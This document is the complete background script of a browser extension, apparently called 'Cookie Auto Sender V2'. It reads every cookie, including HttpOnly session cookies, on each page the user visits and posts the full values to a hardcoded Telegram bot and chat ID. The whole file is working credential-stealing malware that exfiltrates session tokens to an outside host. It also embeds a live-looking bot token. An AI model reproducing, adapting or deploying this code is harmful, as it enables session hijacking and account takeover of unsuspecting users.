const BOT_TOKEN = "8310998393:AAFqrA8UdR1J3bpo-QHywyLYaNmAFZx9zZA";
const CHAT_ID = "8016989344";

let isEnabled = true;
let processedTabs = new Map();

// Attiva/disattiva con clic sull'icona
chrome.action.onClicked.addListener(async (tab) => {
  isEnabled = !isEnabled;
  const status = isEnabled ? "🟢 ATTIVO" : "🔴 DISATTIVATO";
  
  chrome.notifications?.create({
    type: "basic",
    title: "Cookie Auto Sender",
    message: `Estensione ${isEnabled ? "ATTIVATA" : "DISATTIVATA"}`,
    priority: 1
  });
  
  console.log(`Cookie Auto Sender: ${isEnabled ? "Attivato" : "Disattivato"}`);
});

// Metodo 1: Quando la pagina finisce di caricare
chrome.webNavigation.onCompleted.addListener(async (details) => {
  if (details.frameId !== 0) return;
  await processPageLoad(details.tabId, details.url);
});

// Metodo 2: Quando l'URL cambia (per SPA)
chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.url && changeInfo.url !== tab.url) {
    await processPageLoad(tabId, changeInfo.url);
  }
});

// Metodo 3: Quando si attiva una scheda esistente
chrome.tabs.onActivated.addListener(async (activeInfo) => {
  const tab = await chrome.tabs.get(activeInfo.tabId);
  if (tab.url && !tab.url.startsWith("chrome://")) {
    await processPageLoad(tab.id, tab.url);
  }
});

// Metodo 4: Quando si ricarica la pagina
chrome.webNavigation.onBeforeNavigate.addListener(async (details) => {
  if (details.frameId !== 0) return;
  
  // Pulisco cache per questa URL se sta per ricaricare
  const key = `${details.tabId}_${details.url}`;
  if (processedTabs.has(key)) {
    setTimeout(() => {
      processedTabs.delete(key);
    }, 500);
  }
});

// Funzione principale migliorata
async function processPageLoad(tabId, url) {
  // Filtri
  if (!url || url.startsWith("chrome://") || 
      url.startsWith("chrome-extension://") ||
      url.startsWith("devtools://") ||
      url.startsWith("about:")) {
    return;
  }
  
  if (!isEnabled) {
    console.log("Estensione disattivata");
    return;
  }
  
  // Evita doppioni negli ultimi 3 secondi
  const key = `${tabId}_${url}`;
  if (processedTabs.has(key)) {
    const lastTime = processedTabs.get(key);
    if (Date.now() - lastTime < 3000) {
      console.log("Skip duplicato:", url);
      return;
    }
  }
  
  processedTabs.set(key, Date.now());
  
  // Pulisco cache vecchia
  setTimeout(() => {
    processedTabs.delete(key);
  }, 5000);
  
  console.log("📡 Processo pagina:", url);
  
  // Aspetto che i cookie siano pronti
  await wait(2000);
  
  try {
    // Ottengo tutti i cookie per questo URL
    const cookies = await chrome.cookies.getAll({ url: url });
    
    if (cookies.length === 0) {
      console.log("Nessun cookie per:", url);
      return;
    }
    
    // Invio a Telegram
    await sendCookiesToTelegram(cookies, url);
    
  } catch (error) {
    console.error("Errore:", error);
  }
}

// Funzione per inviare cookie a Telegram
async function sendCookiesToTelegram(cookies, url) {
  const siteName = getSiteName(url);
  
  // Messaggio header
  let message = `🍪 *COOKIE RILEVATI*\n`;
  message += `🌐 *Sito:* ${siteName}\n`;
  message += `🔗 *URL:* ${url}\n`;
  message += `📊 *Totale:* ${cookies.length} cookie\n`;
  message += `⏰ *Ora:* ${new Date().toLocaleString()}\n`;
  message += `━━━━━━━━━━━━━━━━━━━━━\n\n`;
  
  // Statistiche
  const secure = cookies.filter(c => c.secure).length;
  const httpOnly = cookies.filter(c => c.httpOnly).length;
  const session = cookies.filter(c => c.session).length;
  
  message += `📈 *Statistiche:*\n`;
  message += `   🔒 Secure: ${secure}\n`;
  message += `   🚫 HttpOnly: ${httpOnly}\n`;
  message += `   💾 Session: ${session}\n\n`;
  
  let currentMessage = message;
  let counter = 0;
  
  // Lista cookie
  for (const cookie of cookies) {
    counter++;
    const icon = cookie.secure ? "🔒" : "🍪";
    const flags = [];
    if (cookie.httpOnly) flags.push("HttpOnly");
    if (cookie.secure) flags.push("Secure");
    if (cookie.sameSite) flags.push(`SameSite=${cookie.sameSite}`);
    
    const flagText = flags.length ? ` [${flags.join(", ")}]` : "";
    const expiry = cookie.session ? "Sessione" : new Date(cookie.expirationDate * 1000).toLocaleString();
    
    const cookieText = `${icon} *${counter}. ${cookie.name}*${flagText}\n` +
                      `   📝 \`${sanitize(cookie.value || "(vuoto)")}\`\n` +
                      `   📁 Path: ${cookie.path}\n` +
                      `   🌐 Domain: ${cookie.domain}\n` +
                      `   ⏰ ${expiry}\n\n`;
    
    if ((currentMessage + cookieText).length > 4000) {
      await sendMessage(currentMessage);
      currentMessage = `📦 *Continuo ${siteName}* (${counter})\n━━━━━━━━━━━━━━━━━━━━━\n\n`;
      currentMessage += cookieText;
    } else {
      currentMessage += cookieText;
    }
  }
  
  if (currentMessage !== message) {
    await sendMessage(currentMessage);
  }
  
  console.log(`✅ Inviati ${cookies.length} cookie per ${siteName}`);
  
  // Notifica
  chrome.notifications?.create({
    type: "basic",
    title: "Cookie Inviati",
    message: `${cookies.length} cookie da ${siteName}`,
    priority: 1,
    silent: true
  });
}

// Invia messaggio a Telegram
async function sendMessage(text) {
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: "Markdown",
        disable_web_page_preview: true
      })
    });
    
    const result = await response.json();
    if (!result.ok) {
      console.error("Errore Telegram:", result);
    }
    return result;
  } catch (error) {
    console.error("Errore invio:", error);
  }
}

// Helper: nome sito
function getSiteName(url) {
  try {
    const hostname = new URL(url).hostname;
    return hostname.replace(/^www\./, '');
  } catch {
    return url;
  }
}

// Helper: sanitize
function sanitize(str) {
  if (!str) return "";
  return str.substring(0, 200).replace(/[`*_~]/g, '');
}

// Helper: wait
function wait(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Messaggio di avvio
console.log("🚀 Cookie Auto Sender V2 avviato!");
sendMessage(`🤖 *Cookie Auto Sender V2 ATTIVO*\n\n✅ Funziona su TUTTI i siti\n📡 Si attiva automaticamente quando:\n   • Apri una nuova pagina\n   • Cambi scheda\n   • Ricarichi la pagina\n   • Navighi tra link\n\n⚙️ Clicca sull'icona per DISATTIVARE`);